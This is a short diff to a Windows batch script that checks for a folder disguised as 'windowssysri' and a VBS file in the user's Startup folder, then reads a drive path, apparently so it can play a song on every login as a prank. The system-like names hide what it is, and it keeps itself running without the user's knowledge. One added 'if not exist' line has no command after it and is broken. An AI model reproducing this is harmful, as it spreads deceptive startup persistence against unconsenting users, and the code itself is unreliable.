@@ -1,7 +1,8 @@
 @echo off
 :main
-if not exist %userprofile%\windowssysri goto install
+if not exist "%userprofile%\windowssysri" goto install
 if not exist "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\testwindowssysri.vbs" goto install
+if not exist "%userprofile%\windowssysri\song.mp3"
 set /p maindrive=<"%userprofile%"\windowssysri\maindrive.sys
 
 rem start %maindrive%roll\cmdmp3.exe %maindrive%roll\song.mp3
